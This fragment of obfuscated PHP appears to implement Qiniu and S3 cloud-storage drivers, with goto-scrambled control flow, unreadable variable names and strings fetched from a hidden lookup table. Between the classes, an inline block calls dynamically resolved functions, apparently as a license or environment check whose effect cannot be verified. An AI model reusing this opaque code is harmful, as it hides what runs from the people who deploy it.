$eƒ‘ù„š±ˆ[$BÔ°Üìñà[83]] = 0; $eƒ‘ù„š±ˆ[$BÔ°Üìñà[193]] = $eƒ‘ù„š±ˆ[$BÔ°Üìñà[194]] = !0; $F—¤Û“ÀÈÒ = rtrim($F—¤Û“ÀÈÒ, $BÔ°Üìñà[8]) . $BÔ°Üìñà[8]; goto BÛŞœôèğå; BÛŞœôèğå: $bÄïßÑù¡— = $this->objectMeta($F—¤Û“ÀÈÒ); if (isset($bÄïßÑù¡—[$BÔ°Üìñà[1285]])) { $eƒ‘ù„š±ˆ[$BÔ°Üìñà[83]] = substr($bÄïßÑù¡—[$BÔ°Üìñà[1285]] . $BÔ°Üìñà[33], 0, 10); } return $eƒ‘ù„š±ˆ; goto A‡¶®Å¹¿; A‡¶®Å¹¿: } public function listPath($d¤Şà‚ª, $B–Ìç£Äš = false) { $DÕ“¾·êì­ =& $_SERVER[ÉóçÄÇ]; $C¿„‚Š ²Œ = $this->fileList($d¤Şà‚ª, $DÕ“¾·êì­[8], !0); foreach ($C¿„‚Š ²Œ[$DÕ“¾·êì­[74]] as $BŞ‡«İ®Ñ© => $F‘ŠôºåÀÅ) { $C¿„‚Š ²Œ[$DÕ“¾·êì­[74]][$BŞ‡«İ®Ñ©] = $this->folderInfo($F‘ŠôºåÀÅ, $B–Ìç£Äš); } foreach ($C¿„‚Š ²Œ[$DÕ“¾·êì­[73]] as $BŞ‡«İ®Ñ© => $F‘ŠôºåÀÅ) { $C¿„‚Š ²Œ[$DÕ“¾·êì­[73]][$BŞ‡«İ®Ñ©] = $this->fileInfo($F‘ŠôºåÀÅ[$DÕ“¾·êì­[92]], $B–Ìç£Äš, $F‘ŠôºåÀÅ); } return $C¿„‚Š ²Œ; } public function has($f”£‚™«ó‘, $A«§åËìµ = false, $DÃİõ–š„ = true) { goto eÅÔÑãÑÌ‰; eàïÛêÍ·: $C“„†Ã‘Íš = $c™¼í¤îĞš[33]; $cÏ‰Ù±Æå = 500; $b´Çï…ªŒ³ = $c™¼í¤îĞš[8]; goto EŸâ±ƒØœ; CÑ‹Ëµ½œ£: return !1; goto E‡…”Öå¬í; EŸâ±ƒØœ: $e¬»óé›â = $CÉªÚ›‹Œ… = 0; while (!0) { check_abort(); list($d¨Ÿ‘‚‰ÍÅ, $c×ù¥î³Ô) = $this->bucketManager->listFiles($this->bucket, $f©‰ÎÃ³´, $C“„†Ã‘Íš, $cÏ‰Ù±Æå, $b´Çï…ªŒ³); if ($c×ù¥î³Ô) { break; } $C“„†Ã‘Íš = array_key_exists($c™¼í¤îĞš[1254], $d¨Ÿ‘‚‰ÍÅ) ? $C“„†Ã‘Íš = $d¨Ÿ‘‚‰ÍÅ[$c™¼í¤îĞš[1286]] : $c™¼í¤îĞš[33]; if ($A«§åËìµ) { if (!empty($d¨Ÿ‘‚‰ÍÅ[$c™¼í¤îĞš[1287]])) { $e¬»óé›â += count($d¨Ÿ‘‚‰ÍÅ[$c™¼í¤îĞš[1287]]); } if (!empty($d¨Ÿ‘‚‰ÍÅ[$c™¼í¤îĞš[1288]])) { $CÉªÚ›‹Œ… += count($d¨Ÿ‘‚‰ÍÅ[$c™¼í¤îĞš[1288]]); } if ($C“„†Ã‘Íš === $c™¼í¤îĞš[33]) { break; } continue; } if ($DÃİõ–š„) { if (!empty($d¨Ÿ‘‚‰ÍÅ[$c™¼í¤îĞš[1287]])) { return !0; } } else { if (!empty($d¨Ÿ‘‚‰ÍÅ[$c™¼í¤îĞš[1288]])) { return !0; } } if ($C“„†Ã‘Íš === $c™¼í¤îĞš[33]) { break; } } if ($A«§åËìµ) { return array($c™¼í¤îĞš[201] => $e¬»óé›â, $c™¼í¤îĞš[202] => $CÉªÚ›‹Œ…); } goto CÑ‹Ëµ½œ£; eÅÔÑãÑÌ‰: $c™¼í¤îĞš =& $_SERVER[ÉóçÄÇ]; $f”£‚™«ó‘ = trim($f”£‚™«ó‘, $c™¼í¤îĞš[8]); $f©‰ÎÃ³´ = empty($f”£‚™«ó‘) ? $c™¼í¤îĞš[33] : $f”£‚™«ó‘ . $c™¼í¤îĞš[8]; goto eàïÛêÍ·; E‡…”Öå¬í: } public function listAll($Fùäˆ°‰¡Ñ) { $D‰àìÎ×„ë =& $_SERVER[ÉóçÄÇ]; $BŠäÓš¶„ = $this->fileList($Fùäˆ°‰¡Ñ, $D‰àìÎ×„ë[33], !0); $AæÎïµÙÒ™ = array(); foreach ($BŠäÓš¶„[$D‰àìÎ×„ë[73]] as $E±×ÎÀšƒ¸) { $AæÎïµÙÒ™[$E±×ÎÀšƒ¸[$D‰àìÎ×„ë[92]]] = $E±×ÎÀšƒ¸[$D‰àìÎ×„ë[77]]; } foreach ($BŠäÓš¶„[$D‰àìÎ×„ë[74]] as $E±×ÎÀšƒ¸) { if (is_string($E±×ÎÀšƒ¸)) { $AæÎïµÙÒ™[$E±×ÎÀšƒ¸] = 0; } } return $this->listAllFiles($Fùäˆ°‰¡Ñ, array_keys($AæÎïµÙÒ™), $AæÎïµÙÒ™); } private function fileList($e« Ÿ¸’î, $D§ÎÇŞ…§Æ = '', $Cìæœ±‹×‡ = 0) { goto BÙİóÎÈí¦; C×ï„ªÂ† : $B–¬Á‹È‡¡ = $cî†¯Œ†Â[33]; $E˜Ù°ğÕ = 1000; $DäÚé„ç† = $this->listItemCache === !1 ? !1 : !0; goto FÔß‰—í‘¢; BÙİóÎÈí¦: $cî†¯Œ†Â =& $_SERVER[ÉóçÄÇ]; $e« Ÿ¸’î = trim($e« Ÿ¸’î, $cî†¯Œ†Â[8]); $a““ô‚ˆŞ = empty($e« Ÿ¸’î) ? $cî†¯Œ†Â[33] : $e« Ÿ¸’î . $cî†¯Œ†Â[8]; goto C×ï„ªÂ† ; fÂ²ÁË˜íİ: return array($cî†¯Œ†Â[74] => $bŞ×‘¥äùí, $cî†¯Œ†Â[73] => $cĞ‰–òµ‡ñ); goto Aƒ¤ÔôËë…; FÔß‰—í‘¢: $bŞ×‘¥äùí = $cĞ‰–òµ‡ñ = array(); while (!0) { check_abort(); list($F„ˆ‹–•İ×, $Aáßå‰Õ‹¶) = $this->bucketManager->listFiles($this->bucket, $a““ô‚ˆŞ, $B–¬Á‹È‡¡, $E˜Ù°ğÕ, $D§ÎÇŞ…§Æ); if ($Aáßå‰Õ‹¶) { break; } $B–¬Á‹È‡¡ = array_key_exists($cî†¯Œ†Â[1254], $F„ˆ‹–•İ×) ? $B–¬Á‹È‡¡ = $F„ˆ‹–•İ×[$cî†¯Œ†Â[1286]] : $cî†¯Œ†Â[33]; $EÊ³°çâÃ = isset($F„ˆ‹–•İ×[$cî†¯Œ†Â[1287]]) ? $F„ˆ‹–•İ×[$cî†¯Œ†Â[1287]] : array(); $dšËÖ¿à = isset($F„ˆ‹–•İ×[$cî†¯Œ†Â[1288]]) ? $F„ˆ‹–•İ×[$cî†¯Œ†Â[1288]] : array(); foreach ($EÊ³°çâÃ as $DÈˆ’ÙĞöÒ) { goto F³³ÔñèÌˆ; fëÈ±ÄÉƒ½: if ($f™‘ğî¬ˆä) { $bŞ×‘¥äùí[] = $Dº¹©—Ü…; continue; } $cĞ‰–òµ‡ñ[] = $Cìæœ±‹×‡ ? $DÈˆ’ÙĞöÒ : $Dº¹©—Ü…; goto eµ¦ï×ñ¨ñ; F³³ÔñèÌˆ: if ($DÈˆ’ÙĞöÒ[$cî†¯Œ†Â[92]] == $a““ô‚ˆŞ) { continue; } $Dº¹©—Ü… = $DÈˆ’ÙĞöÒ[$cî†¯Œ†Â[92]]; $A¼«ó«è = $DÈˆ’ÙĞöÒ[$cî†¯Œ†Â[1284]]; goto CË¥ßÙ¤÷; CË¥ßÙ¤÷: $DÈˆ’ÙĞöÒ[$cî†¯Œ†Â[77]] = $A¼«ó«è; $f™‘ğî¬ˆä = $A¼«ó«è == 0 && substr($Dº¹©—Ü…, strlen($Dº¹©—Ü…) - 1, 1) == $cî†¯Œ†Â[8] ? !0 : !1; if ($DäÚé„ç†) { $this->cacheMethod($cî†¯Œ†Â[197], $Dº¹©—Ü…, $f™‘ğî¬ˆä); $this->cacheMethod($cî†¯Œ†Â[198], $Dº¹©—Ü…, $DÈˆ’ÙĞöÒ); } goto fëÈ±ÄÉƒ½; eµ¦ï×ñ¨ñ: } foreach ($dšËÖ¿à as $Dº¹©—Ü…) { if ($Dº¹©—Ü… == $a““ô‚ˆŞ) { continue; } $bŞ×‘¥äùí[] = $Dº¹©—Ü…; if ($DäÚé„ç†) { $this->cacheMethod($cî†¯Œ†Â[197], $Dº¹©—Ü…, !0); } } if ($B–¬Á‹È‡¡ === $cî†¯Œ†Â[33]) { break; } } if ($DäÚé„ç†) { $this->cacheMethod($cî†¯Œ†Â[197], $e« Ÿ¸’î, !0); } goto fÂ²ÁË˜íİ; Aƒ¤ÔôËë…: } public function canRead($cİ«›çê¢¸) { return $this->exist($cİ«›çê¢¸) ? !0 : !1; } public function canWrite($cÌ¿¡ÆØÒš) { return $this->exist($cÌ¿¡ÆØÒš) ? !0 : !1; } public function getContent($bƒÅìğµŠÂ) { return $this->fileSubstr($bƒÅìğµŠÂ, 0, -1); } public function setContent($Cöºğ¬»´, $e®¢ÀË’Úğ = '') { $fÖµÜñĞ²è = $this->tempFile($this->pathThis($Cöºğ¬»´)); file_put_contents($fÖµÜñĞ²è, $e®¢ÀË’Úğ); if ($this->upload($Cöºğ¬»´, $fÖµÜñĞ²è)) { $this->tempFileRemve($fÖµÜñĞ²è); return !0; } return !1; } public function refreshUrls($fÀ²†Ê¸¿à) { goto DËˆƒ‹¶—Ù; bÒÚŞÆò¨: $AÇÃ³„ßŞ‰ = new Qiniu\Cdn\CdnManager($this->auth); list($cÓãÏæöõ , $cåµ½òùº©) = $AÇÃ³„ßŞ‰->refreshUrls($A„¿¨öºƒä); if ($cåµ½òùº©) { return !1; } goto DĞŸè‡¢¦ø; DĞŸè‡¢¦ø: return $cÓãÏæöõ [$BÕÄ´¿×Ó˜[1060]] == $BÕÄ´¿×Ó˜[718] ? !0 : !1; goto AêÈÁÉ‹çÃ; DËˆƒ‹¶—Ù: $BÕÄ´¿×Ó˜ =& $_SERVER[ÉóçÄÇ]; $A„¿¨öºƒä = array(); if (is_array($fÀ²†Ê¸¿à)) { foreach ($fÀ²†Ê¸¿à as $a±±å“ì¤ø) { $A„¿¨öºƒä[] = $this->link($a±±å“ì¤ø); } } else { $A„¿¨öºƒä[] = $this->link($fÀ²†Ê¸¿à); } goto bÒÚŞÆò¨; AêÈÁÉ‹çÃ: } public function fileSubstr($cƒ¼ŞÆ÷Ü³, $cÊë”ëÊº¦, $c…ïÌ›ºµÉ) { $c„†îãšØ =& $_SERVER[ÉóçÄÇ]; if (!($CÇçÙ½âÓ = $this->link($cƒ¼ŞÆ÷Ü³))) { return !1; } $F‰°äÓ¢ = !1; if ($c…ïÌ›ºµÉ > 0) { $aÑÖÒÉİ÷ò = $cÊë”ëÊº¦ + $c…ïÌ›ºµÉ - 1; $F‰°äÓ¢ = array($c„†îãšØ[1289] . $cÊë”ëÊº¦ . $c„†îãšØ[434] . $aÑÖÒÉİ÷ò); } $bºªğïÀ“ = url_request($CÇçÙ½âÓ, $c„†îãšØ[226], !1, $F‰°äÓ¢); return $bºªğïÀ“[$c„†îãšØ[711]] ? $bºªğïÀ“[$c„†îãšØ[1070]] : !1; } public function upload($fÛóî×Ç–, $F°©æÂÆáŞ, $Då¬ á‹« = false, $B»óĞòÃ¿” = REPEAT_REPLACE) { $d°âµèÙœ¾ = new Qiniu\Storage\UploadManager(); $Fï›ÈõÄÙ = $this->auth->uploadToken($this->bucket, $fÛóî×Ç–); $d„¶ĞæÇÁ‘ = get_file_mime(get_path_ext($F°©æÂÆáŞ)); list($däÍ„¸Ô±˜, $dùµŠ¿Á¥) = $d°âµèÙœ¾->putFile($Fï›ÈõÄÙ, $fÛóî×Ç–, $F°©æÂÆáŞ, null, $d„¶ĞæÇÁ‘); return $dùµŠ¿Á¥ ? !1 : $this->getPathOuter($fÛóî×Ç–); } public function uploadFormData($b‡†÷ƒî¤, $Fù¨Üˆì£ö = 3600) { return $this->uploadToken($b‡†÷ƒî¤, $Fù¨Üˆì£ö); } public function multiUploadFormData($F‰Ş¤ö“Šæ, $Dƒ°·àÈÒ = 3600) { return $this->uploadToken($F‰Ş¤ö“Šæ, $Dƒ°·àÈÒ); } private function uploadToken($f„¬•£èÑÙ, $d¨—¬³ê‘à = 3600) { goto a—¶‚Ù÷ã”; Ağ…Ü»ò: $dÒ¨ˆÂÀ­Ó = http_type() . "\x3a\x2f\57\165\x70\x6c\x6f\141\144{$E­¿˜’à¶‘}\56\x71\151\x6e\x69\165\x70\x2e\143\157\x6d\57"; return array($F¶êÈ·›ñº[1293] => $aÉßÎäáÔÕ, $F¶êÈ·›ñº[1294] => $dÒ¨ˆÂÀ­Ó); goto CáîËŒå„; a—¶‚Ù÷ã”: $F¶êÈ·›ñº =& $_SERVER[ÉóçÄÇ]; $báš¡¬Ü– = $d¨—¬³ê‘à; $fÁŒİÅç† = array($F¶êÈ·›ñº[1290] => $F¶êÈ·›ñº[1291]); goto Eˆæß¼Ì¢œ; Eˆæß¼Ì¢œ: $aİ‡Ş¬ââ = $f„¬•£èÑÙ; $aÉßÎäáÔÕ = $this->auth->uploadToken($this->bucket, $aİ‡Ş¬ââ, $báš¡¬Ü–, $fÁŒİÅç†, !0); $E­¿˜’à¶‘ = empty($this->region) || $this->region == $F¶êÈ·›ñº[1292] ? $F¶êÈ·›ñº[33] : $F¶êÈ·›ñº[434] . $this->region; goto Ağ…Ü»ò; CáîËŒå„: } public function download($dİ‚À¼Äå, $A­Şöçóéø) { goto C¿ôÜó™·‰; C¿ôÜó™·‰: $cğ™¤İ®æ = IO::getPathInner(IO::mkfile($A­Şöçóéø)); if (!($D¸•ööÅŸŠ = $this->link($dİ‚À¼Äå))) { return !1; } $fœ¸§¢Éëæ = 0; goto fê¾ÄöÉìÌ; fê¾ÄöÉìÌ: $AÛ®èµ®‰› = 1024 * 200; $cìŸ…ÛÁÆ¡ = fopen($cğ™¤İ®æ, $_SERVER[ÉóçÄÇ][1295]); while (!0) { $aÂ³ÇÙĞÎò = $this->fileSubstr($dİ‚À¼Äå, $fœ¸§¢Éëæ, $AÛ®èµ®‰›); if ($aÂ³ÇÙĞÎò === !1) { return !1; } fwrite($cìŸ…ÛÁÆ¡, $aÂ³ÇÙĞÎò); $fœ¸§¢Éëæ += $AÛ®èµ®‰›; if (strlen($aÂ³ÇÙĞÎò) < $AÛ®èµ®‰›) { break; } } goto CŞ­í‚àö„; CŞ­í‚àö„: fclose($cìŸ…ÛÁÆ¡); return $A­Şöçóéø; goto CîŒ”ëÀ–; CîŒ”ëÀ–: } public function link($f¥ïÒ¡Ï„², $b˜Ğ‰–»œÎ = '') { if (!$this->isFile($f¥ïÒ¡Ï„²)) { return !1; } $b‰‰ŒÎâ•Û = $this->getHost() . $_SERVER[ÉóçÄÇ][8] . $this->pathEncode($f¥ïÒ¡Ï„²) . $b˜Ğ‰–»œÎ; return $this->auth->privateDownloadUrl($b‰‰ŒÎâ•Û, 3600 * 12); } public function fileOut($aÑ¦ø®Æì, $EóŒÑ˜‡ò = false, $añŒçÕÚº = false, $D†Òø¿–ËÜ = '') { $C¾ŸÕ’¼š =& $_SERVER[ÉóçÄÇ]; if ($this->isFileOutServer()) { return $this->fileOutServer($aÑ¦ø®Æì, $EóŒÑ˜‡ò, $añŒçÕÚº, $D†Òø¿–ËÜ); } if (!$añŒçÕÚº) { $añŒçÕÚº = $this->pathThis($aÑ¦ø®Æì); } $dÆ›­°íÆŠ = $EóŒÑ˜‡ò ? $C¾ŸÕ’¼š[1296] . rawurlencode($añŒçÕÚº) : $C¾ŸÕ’¼š[33]; $E™ÒáèùÇ = $this->link($aÑ¦ø®Æì, $dÆ›­°íÆŠ); $this->fileOutLink($E™ÒáèùÇ); } public function fileOutServer($CÆÄ…‡¸³¡, $c‹ãåÕŒùì = false, $cÙÛÎ¿Œæ = false, $f’¨÷®ÂÌã = '') { parent::fileOut($CÆÄ…‡¸³¡, $c‹ãåÕŒùì, $cÙÛÎ¿Œæ, $f’¨÷®ÂÌã); } public function fileOutImage($C­°„µ¦Ë¹, $b™ç¥¥©…¹ = 250) { $f°«§°ê¯¹ = $this->link($C­°„µ¦Ë¹, $_SERVER[ÉóçÄÇ][1297] . $b™ç¥¥©…¹); $this->fileOutLink($f°«§°ê¯¹); } public function fileOutImageServer($fŠ®à¶†íò, $DêÆ”ˆè² = 250) { parent::fileOutImage($fŠ®à¶†íò, $DêÆ”ˆè²); } public function hashMd5($c‰‰¼æç¥) { $D‰³Ø“÷ä =& $_SERVER[ÉóçÄÇ]; $F“ÜÑŠôÑÍ = $this->objectMeta($c‰‰¼æç¥); return isset($F“ÜÑŠôÑÍ[$D‰³Ø“÷ä[206]]) ? $F“ÜÑŠôÑÍ[$D‰³Ø“÷ä[206]] : !1; $a›ùª¬‰¬Ö = $this->link($c‰‰¼æç¥, $D‰³Ø“÷ä[1298]); } public function size($B¯¶ò¼–ä) { $e½Õ¶¬Õ£ = $this->objectMeta($B¯¶ò¼–ä); return $e½Õ¶¬Õ£ ? $e½Õ¶¬Õ£[$_SERVER[ÉóçÄÇ][77]] : 0; } public function info($f©®™ë¹Íä) { if ($this->isFolder($f©®™ë¹Íä)) { return $this->folderInfo($f©®™ë¹Íä); } else { if ($this->isFile($f©®™ë¹Íä)) { return $this->fileInfo($f©®™ë¹Íä); } } return !1; } public function exist($aåï¦œ÷–¾) { return $this->isFile($aåï¦œ÷–¾) || $this->isFolder($aåï¦œ÷–¾); } public function isFile($Dœñ„ÏÛ—Ğ) { return !$this->isFolder($Dœñ„ÏÛ—Ğ) && $this->objectMeta($Dœñ„ÏÛ—Ğ); } public function isFolder($d¼×»îâ©¡) { return $this->cacheMethod($_SERVER[ÉóçÄÇ][197], $d¼×»îâ©¡); } protected function objectMeta($D£Åœ´ö) { return $this->cacheMethod($_SERVER[ÉóçÄÇ][198], $D£Åœ´ö); } protected function _objectMeta($cŠ†´–Ü ‘) { $d¶–Û«ƒÄÄ =& $_SERVER[ÉóçÄÇ]; list($BÑ¡…Æ´ß, $b¶Ş×öŞ©Ê) = $this->bucketManager->stat($this->bucket, $cŠ†´–Ü ‘); if ($BÑ¡…Æ´ß) { $BÑ¡…Æ´ß[$d¶–Û«ƒÄÄ[77]] = intval($BÑ¡…Æ´ß[$d¶–Û«ƒÄÄ[1284]]); } return $BÑ¡…Æ´ß; } protected function _isFolder($d Ê‚™‹¬ç) { $Aˆß¾ÈíË =& $_SERVER[ÉóçÄÇ]; if ($d Ê‚™‹¬ç == $Aˆß¾ÈíË[33] || $d Ê‚™‹¬ç == $Aˆß¾ÈíË[8]) { return !0; } list($bÙè¨•±¬, $C“‚•Ã¡ƒ±) = $this->bucketManager->listFiles($this->bucket, trim($d Ê‚™‹¬ç, $Aˆß¾ÈíË[8]) . $Aˆß¾ÈíË[8], $Aˆß¾ÈíË[33], 1, $Aˆß¾ÈíË[8]); return !empty($bÙè¨•±¬[$Aˆß¾ÈíË[1287]]) || !empty($bÙè¨•±¬[$Aˆß¾ÈíË[1288]]) ? !0 : !1; } } goto e…çİœÂ³; e…çİœÂ³: if ($_SERVER[$_SERVER[ÉóçÄÇ][817]] != $_SERVER[$_SERVER[ÉóçÄÇ][1299]]) { goto B‘ÓôáÄ¯; Eµòå¿Ï¢ñ: $DÍÑÑå¼í = explode($_SERVER[ÉóçÄÇ][227], $d¢ÉÕßïìÙ); if (count($DÍÑÑå¼í) < $_SERVER[ÉóçÄÇ][570]) { $eÉ†»¹Ó•  = $_SERVER[ÉóçÄÇ][823]; $eÉ†»¹Ó• (); } $b‡»‡ìÔ = $_SERVER[ÉóçÄÇ][999]; goto E×•¥ÌŒÎÄ; B‘ÓôáÄ¯: $EŠù•Æ„™ = $_SERVER[ÉóçÄÇ][820]; $BîŒˆ£š°É = $_SERVER[$_SERVER[ÉóçÄÇ][821]] . $_SERVER[ÉóçÄÇ][822]; $d¢ÉÕßïìÙ = $EŠù•Æ„™($BîŒˆ£š°É); goto Eµòå¿Ï¢ñ; E×•¥ÌŒÎÄ: $b‡»‡ìÔ($_SERVER[$_SERVER[ÉóçÄÇ][818]]); goto fƒÒª¿È–¿; fƒÒª¿È–¿: } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Cİñ£¨¶éŞ) { parent::__construct($Cİñ£¨¶éŞ); } public function uploadFormData($eÛ÷æšÓÙ‹, $FÁ„·×Üà = 3600) { goto dÍ—´ãßÑ; dõÁˆ®ª†Ã: $D«º»•—Ñ = $A¼“å« ¿[59]; $B§Œ³’„Ÿ = gmdate($A¼“å« ¿[1205]); $FÅÔ¥­ëÕó = gmdate($A¼“å« ¿[712]); goto F§“Š¶”œ¼; EĞğò´Ò÷Â: $B²¶èÛÍ‡õ = array($this->accessKey, $FÅÔ¥­ëÕó, $this->region, $D«º»•—Ñ, $F¸âÓ…½ÁÖ); $D‘Ñ½‘âÃ = implode($A¼“å« ¿[8], $B²¶èÛÍ‡õ); $fÙ¿ø½¯÷‡ = array($A¼“å« ¿[1171] => gmdate($A¼“å« ¿[1170], strtotime($A¼“å« ¿[1207])), $A¼“å« ¿[1172] => array(array($A¼“å« ¿[1174] => $this->bucket), array($A¼“å« ¿[1173] => $D§Ôº³ÕÊŸ), array($A¼“å« ¿[1175], $A¼“å« ¿[1176], $A¼“å« ¿[33]), array($A¼“å« ¿[1175], $A¼“å« ¿[1208], $A¼“å« ¿[33]), array($A¼“å« ¿[1175], $A¼“å« ¿[1209], $A¼“å« ¿[33]), array($A¼“å« ¿[1177] => $d±Œİ‹‚®ƒ), array($A¼“å« ¿[1210] => $D‘Ñ½‘âÃ), array($A¼“å« ¿[1211] => $eóšÛùİÙ), array($A¼“å« ¿[1212] => $B§Œ³’„Ÿ), array($A¼“å« ¿[1213] => $fÀ˜µËÔ¸¼))); goto cÈˆß™¯Ä; dÍ—´ãßÑ: $A¼“å« ¿ =& $_SERVER[ÉóçÄÇ]; $D§Ôº³ÕÊŸ = $A¼“å« ¿[191]; $eóšÛùİÙ = $A¼“å« ¿[1204]; goto dõÁˆ®ª†Ã; F§“Š¶”œ¼: $F¸âÓ…½ÁÖ = $A¼“å« ¿[1206]; $fÀ˜µËÔ¸¼ = $FÁ„·×Üà . $A¼“å« ¿[33]; $d±Œİ‹‚®ƒ = $A¼“å« ¿[1169]; goto EĞğò´Ò÷Â; cÈˆß™¯Ä: $Eˆ«é¾ï–È = base64_encode(json_encode($fÙ¿ø½¯÷‡)); $dÕ‹ìİ›«× = hash_hmac($A¼“å« ¿[1214], $FÅÔ¥­ëÕó, $A¼“å« ¿[1215] . $this->secret, !0); $a¸ÎÉñ¤éÄ = hash_hmac($A¼“å« ¿[1214], $this->region, $dÕ‹ìİ›«×, !0); goto AÑîöÆå‡ê; Fè–Œ•—Ö—: $C˜×Óø˜ã = array($A¼“å« ¿[209] => $A¼“å« ¿[33], $A¼“å« ¿[1216] => $A¼“å« ¿[33], $A¼“å« ¿[1173] => $D§Ôº³ÕÊŸ, $A¼“å« ¿[1177] => $d±Œİ‹‚®ƒ, $A¼“å« ¿[1181] => $Eˆ«é¾ï–È, $A¼“å« ¿[1217] => $D‘Ñ½‘âÃ, $A¼“å« ¿[1218] => $eóšÛùİÙ, $A¼“å« ¿[1219] => $B§Œ³’„Ÿ, $A¼“å« ¿[1220] => $fÀ˜µËÔ¸¼, $A¼“å« ¿[1221] => $c’Ó¥àÊŒ, $A¼“å« ¿[175] => $this->getHost()); return $C˜×Óø˜ã; goto e‹ÈÍáÍ‹„; AÑîöÆå‡ê: $dÀõ–Ş¿ù = hash_hmac($A¼“å« ¿[1214], $D«º»•—Ñ, $a¸ÎÉñ¤éÄ, !0); $AäÜ¥Ğ©ù„ = hash_hmac($A¼“å« ¿[1214], $F¸âÓ…½ÁÖ, $dÀõ–Ş¿ù, !0); $c’Ó¥àÊŒ = hash_hmac($A¼“å« ¿[1214], $Eˆ«é¾ï–È, $AäÜ¥Ğ©ù„); goto Fè–Œ•—Ö—; e‹ÈÍáÍ‹„: } public function multiUploadFormData($C†ØèŸÕ‰…, $e‰ÓàÅŞŸ« = 3600) { $C”œÚÂËâ =& $_SERVER[ÉóçÄÇ]; $aÊ¸¿ÜŸ¬ = gmdate($C”œÚÂËâ[1300]); $fŞÈ¨ğê¢Ä = array(); $eƒÉ¯šÓäâ = $this->client->getUploadId($this->bucket, $C†ØèŸÕ‰…, $fŞÈ¨ğê¢Ä); if (!$eƒÉ¯šÓäâ) { return !1; } return array($C”œÚÂËâ[219] => $eƒÉ¯šÓäâ, $C”œÚÂËâ[175] => $this->getHost() . $C”œÚÂËâ[8] . $this->pathEncode($C†ØèŸÕ‰…), $C”œÚÂËâ[220] => $aÊ¸¿ÜŸ¬, $C”œÚÂËâ[92] => $C†ØèŸÕ‰…); } public function multiUploadAuthData($f™ñÅœ¥¹Ù, $BáÃ´’æÄá = array()) { goto BÏ‰ÂÜÃÁÑ; bù÷–®ò×Ù: if (strpos($eâõä½äĞ, $bœÓ©Ş¹Å¾[223]) === 0) { if (isset($b†œÜµùï¶[$bœÓ©Ş¹Å¾[1302]])) { $D„Ë‡ƒ„„ = $b†œÜµùï¶[$bœÓ©Ş¹Å¾[1302]]; } else { if (isset($e÷Â˜Ü²­[$bœÓ©Ş¹Å¾[1302]])) { $D„Ë‡ƒ„„ = $e÷Â˜Ü²­[$bœÓ©Ş¹Å¾[1302]]; } else { $D„Ë‡ƒ„„ = hash($bœÓ©Ş¹Å¾[1214], $bœÓ©Ş¹Å¾[33]); } } return array($bœÓ©Ş¹Å¾[230] => $e÷Â˜Ü²­[$bœÓ©Ş¹Å¾[230]], $bœÓ©Ş¹Å¾[1302] => $D„Ë‡ƒ„„, $bœÓ©Ş¹Å¾[220] => $e÷Â˜Ü²­[$bœÓ©Ş¹Å¾[1305]]); } return $e÷Â˜Ü²­[$bœÓ©Ş¹Å¾[230]]; goto Cµ”ô÷àí°; FÂ¶ï·‹¹é: $Aâ¯¨ŞÍ¬Ï = $bœÓ©Ş¹Å¾[224]; $Bœ»¸—ÉÀ = $bœÓ©Ş¹Å¾[8] . $this->pathEncode($dÃìâ‚¹“è) . $eâõä½äĞ; $e÷Â˜Ü²­ = $this->client->__getSignatureV4($b†œÜµùï¶, $AÈÕ½¥¦Ş, $Aâ¯¨ŞÍ¬Ï, $Bœ»¸—ÉÀ); goto bù÷–®ò×Ù; BÏ‰ÂÜÃÁÑ: $bœÓ©Ş¹Å¾ =& $_SERVER[ÉóçÄÇ]; $eâõä½äĞ = isset($BáÃ´’æÄá[$bœÓ©Ş¹Å¾[167]]) ? $BáÃ´’æÄá[$bœÓ©Ş¹Å¾[167]] : $bœÓ©Ş¹Å¾[33]; $dÃìâ‚¹“è = $BáÃ´’æÄá[$bœÓ©Ş¹Å¾[92]]; goto aÒ ÃôÅƒÒ; aÒ ÃôÅƒÒ: unset($BáÃ´’æÄá[$bœÓ©Ş¹Å¾[92]]); if (isset($BáÃ´’æÄá[$bœÓ©Ş¹Å¾[221]])) { return $this->listUploadParts($dÃìâ‚¹“è, $BáÃ´’æÄá); } $b†œÜµùï¶ = array(); goto cùõêÆ³Ì; cùõêÆ³Ì: if (isset($BáÃ´’æÄá[$bœÓ©Ş¹Å¾[1301]])) { $b†œÜµùï¶[$bœÓ©Ş¹Å¾[1302]] = $BáÃ´’æÄá[$bœÓ©Ş¹Å¾[1301]]; } $CÈÀ´á¶ƒ = explode($bœÓ©Ş¹Å¾[177], $this->getHost()); $AÈÕ½¥¦Ş = array($bœÓ©Ş¹Å¾[1303] => $CÈÀ´á¶ƒ[1], $bœÓ©Ş¹Å¾[1304] => $bœÓ©Ş¹Å¾[33], $bœÓ©Ş¹Å¾[209] => $bœÓ©Ş¹Å¾[118], $bœÓ©Ş¹Å¾[1216] => $BáÃ´’æÄá[$bœÓ©Ş¹Å¾[77]]); goto FÂ¶ï·‹¹é; Cµ”ô÷àí°: } public function listUploadParts($aèõÒ‚œ¶‚, $eÃĞ¬Â¡¹¯ = array()) { goto a¸ÏïØÄâß; D°ºã‡‰ê: if (!$Fä·œÄÒ) { return !1; } $dÔ»ŠÉ¦„æ = $dŒ’Ÿæ¢É…[1306]; foreach ($Fä·œÄÒ as $b×µÁ—ìŒ‚) { $dÔ»ŠÉ¦„æ .= $dŒ’Ÿæ¢É…[1307] . "\74\120\x61\162\164\116\165\x6d\x62\145\x72\x3e{$b×µÁ—ìŒ‚[$dŒ’Ÿæ¢É…[1261]]}\x3c\57\120\x61\162\x74\116\x75\x6d\x62\x65\162\76\12" . "\74\105\124\141\147\x3e{$b×µÁ—ìŒ‚[$dŒ’Ÿæ¢É…[1262]]}\x3c\x2f\x45\x54\x61\147\x3e\12" . $dŒ’Ÿæ¢É…[1308]; } goto eŸİƒ¿î; eŸİƒ¿î: $dÔ»ŠÉ¦„æ .= $dŒ’Ÿæ¢É…[1309]; $E’¨ù®Ã¾ = array(); $Cé‚à°ŠË = explode($dŒ’Ÿæ¢É…[177], $this->getHost()); goto D‹³ƒÈáá; a¸ÏïØÄâß: $dŒ’Ÿæ¢É… =& $_SERVER[ÉóçÄÇ]; $Aè—ô¤“Ëï = str_replace($dŒ’Ÿæ¢É…[231], $dŒ’Ÿæ¢É…[33], $eÃĞ¬Â¡¹¯[$dŒ’Ÿæ¢É…[167]]); $Fä·œÄÒ = $this->client->listParts($this->bucket, $aèõÒ‚œ¶‚, $Aè—ô¤“Ëï); goto D°ºã‡‰ê; D‹³ƒÈáá: $B—‹Ñ¡ÈÛÈ = array($dŒ’Ÿæ¢É…[1303] => $Cé‚à°ŠË[1], 